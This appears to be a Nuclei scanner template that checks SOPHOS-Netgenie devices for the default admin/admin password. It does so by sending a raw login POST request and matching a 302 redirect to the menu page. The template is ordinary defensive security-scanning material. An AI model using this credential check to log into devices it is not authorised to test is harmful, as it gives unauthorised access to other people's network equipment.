id: sophos-netgenie-default-password
info:
  name: SOPHOS-Netgenie Default Password Detection
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    SOPHOS-Netgenie devices are shipped with a default password (admin/admin) that can be exploited by attackers to gain unauthorized access and perform sensitive operations.
  tags: default-password
  reference:
    - https://fofa.so/
http:
  - raw:
      - |
        POST /tweb/index.php?op=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=admin
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "Location: /tweb/menu.php"
